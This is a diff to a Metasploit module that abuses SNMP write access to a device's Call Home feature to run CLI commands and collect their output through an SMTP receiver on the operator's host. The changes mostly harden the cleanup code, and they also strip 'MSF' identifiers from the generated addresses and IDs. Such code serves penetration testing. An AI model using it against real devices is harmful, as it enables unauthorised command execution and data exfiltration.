@@ -211,8 +211,8 @@ class MetasploitModule < Msf::Auxiliary
     begin
       connect_snmp
       @callback_host = advertised_smtp_host
-      @smtp_address = "msf-#{Rex::Text.rand_text_alphanumeric(10).downcase}@example.invalid"
-      @request_id = "MSF-#{Rex::Text.rand_text_alphanumeric(12).upcase}"
+      @smtp_address = "#{Rex::Text.rand_text_alphanumeric(10).downcase}@example.invalid"
+      @request_id = Rex::Text.rand_text_alphanumeric(12).upcase
       prepare_callhome_state
       start_smtp_receiver
       stage_callhome_command
@@ -228,9 +228,15 @@ class MetasploitModule < Msf::Auxiliary
       module_failure = e
       processing_error = { type: :module_failure, message: fail_detail || e.message }
     ensure
-      restore_callhome_state
-      stop_smtp_receiver
-      disconnect_snmp
+      begin
+        restore_callhome_state
+      ensure
+        begin
+          stop_smtp_receiver
+        ensure
+          disconnect_snmp
+        end
+      end
     end
 
     if @restoration_failed
@@ -325,12 +331,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def trigger_callhome_command
-    @callback_deadline = Process.clock_gettime(Process::CLOCK_MONOTONIC) + datastore['CALLBACK_TIMEOUT']
-
     set_varbinds('Trigger Call Home CLI execution', [integer_varbind(CLI_TRIGGER_OID, TRUTH_VALUE_TRUE)])
     trigger = read_oid(CLI_TRIGGER_OID)
 
     fail_with(Msf::Module::Failure::UnexpectedReply, 'Call Home trigger did not return to false') if exception_value?(trigger) || trigger.to_i != TRUTH_VALUE_FALSE
+
+    @callback_deadline = Process.clock_gettime(Process::CLOCK_MONOTONIC) + datastore['CALLBACK_TIMEOUT']
 
     print_status("Waiting up to #{datastore['CALLBACK_TIMEOUT']} seconds for CLI output")
   end
@@ -471,39 +477,44 @@ class MetasploitModule < Msf::Auxiliary
   def restore_callhome_state
     controls_restored = true
     smtp_row_removed = true
+    @restoration_failed = @controls_staged || @smtp_row_created
 
-    if @controls_staged
-      begin
-        controls_restored = set_varbinds(
-          'Restore Call Home CLI controls',
-          control_varbinds(@original_controls.except(:trigger)),
-          fatal: false
-        )
+    begin
+      if @controls_staged
+        begin
+          controls_restored = set_varbinds(
+            'Restore Call Home CLI controls',
+            control_varbinds(@original_controls.except(:trigger)),
+            fatal: false
+          )
 
-        readback = read_controls
-        controls_restored &&= @original_controls.all? do |name, expected|
-          actual = readback[name]
-          INTEGER_CONTROLS.include?(name) ? actual.to_i == expected.to_i : actual.to_s == expected.to_s
+          readback = read_controls
+          controls_restored &&= @original_controls.all? do |name, expected|
+            actual = readback[name]
+            INTEGER_CONTROLS.include?(name) ? actual.to_i == expected.to_i : actual.to_s == expected.to_s
+          end
+        rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::ParseError => e
+          controls_restored = false
+          elog('Call Home CLI control restoration failed', error: e)
+          print_error("Call Home CLI control restoration failed: #{e.message}")
         end
-      rescue StandardError => e
-        controls_restored = false
-        print_error("Call Home CLI control restoration failed: #{e.message}")
       end
-    end
+    ensure
+      if @smtp_row_created
+        begin
+          row_destroyed = set_varbinds(
+            'Destroy temporary SMTP row',
+            [integer_varbind(@smtp_status_oid, ROW_STATUS_DESTROY)],
+            fatal: false
+          )
 
-    if @smtp_row_created
-      begin
-        row_destroyed = set_varbinds(
-          'Destroy temporary SMTP row',
-          [integer_varbind(@smtp_status_oid, ROW_STATUS_DESTROY)],
-          fatal: false
-        )
-
-        row_absent = exception_value?(read_oid(@smtp_status_oid))
-        smtp_row_removed = row_destroyed && row_absent
-      rescue StandardError => e
-        smtp_row_removed = false
-        print_error("Temporary SMTP row cleanup failed: #{e.message}")
+          row_absent = exception_value?(read_oid(@smtp_status_oid))
+          smtp_row_removed = row_destroyed && row_absent
+        rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::ParseError => e
+          smtp_row_removed = false
+          elog('Temporary SMTP row cleanup failed', error: e)
+          print_error("Temporary SMTP row cleanup failed: #{e.message}")
+        end
       end
     end
 
